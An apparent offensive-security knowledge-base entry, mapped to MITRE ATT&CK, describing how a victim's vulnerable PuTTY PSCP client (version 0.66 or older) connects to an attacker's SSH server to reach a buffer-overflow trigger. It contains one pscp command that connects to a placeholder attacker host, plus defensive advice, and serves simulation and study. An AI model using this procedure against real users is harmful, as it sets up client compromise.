---
id: proc-connect-putty-client
tags:
  - putty
  - pscp
  - ssh-client
type: procedure
tools:
  - '[[tools/PuTTY-PSCP]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/pscp-connect-transfer]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:30:58.705Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Connect-Vulnerable-PuTTY-PSCP-Client

## Summary

This procedure simulates the victim's action of connecting a vulnerable PuTTY PSCP client to the malicious server, authenticating, and initiating a file transfer to reach the post-authentication vulnerability trigger point.

## Description

On a Windows target with PuTTY <=0.66, the PSCP command is used to connect to the attacker's SSH server, provide credentials, and request a file transfer. This advances the session to post-auth processing where remote file sizes are parsed unsafely via sscanf without bounds checks, setting up the buffer overflow. The procedure assumes the victim is tricked into running the command (e.g., via phishing). Outcomes include successful authentication and transfer start, leading to exploit readiness.

## Requirements

1. PuTTY PSCP version <=0.66 installed on Windows
2. Valid SSH username/password for the malicious server
3. Network connectivity to attacker's IP on port 22

## Defense

Defensive measures and detection strategies:

- Update PuTTY to latest version (>0.66)
- Monitor outbound SSH connections to unknown hosts
- Implement application whitelisting to restrict PSCP usage

## Objectives

1. Establish authenticated SSH session from client
2. Initiate SCP file transfer to trigger vuln parsing
3. Position for server-side payload delivery

## Instructions

### Step 1: Prepare PSCP Command

**Context**: Construct the connection command with credentials and file paths to mimic a legitimate transfer.

No command execution here; prepare parameters: user:pass@attacker-ip:/remote/fakefile localfile.txt

### Step 2: Execute Connection and Transfer

**Context**: Run PSCP to connect and start transfer, entering vulnerable code path.

Execute [[commands/pscp-connect-transfer]]:

```bash
pscp -scp user:pass@attacker-ip:/remote/file localfile
```

> Authentication occurs; transfer request sent, server responds with crafted size.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

- N/A

## Commands Used

- [[commands/pscp-connect-transfer]]

## Tools Used

- [[tools/PuTTY-PSCP]]

## Tags

- putty
- pscp
- ssh-client
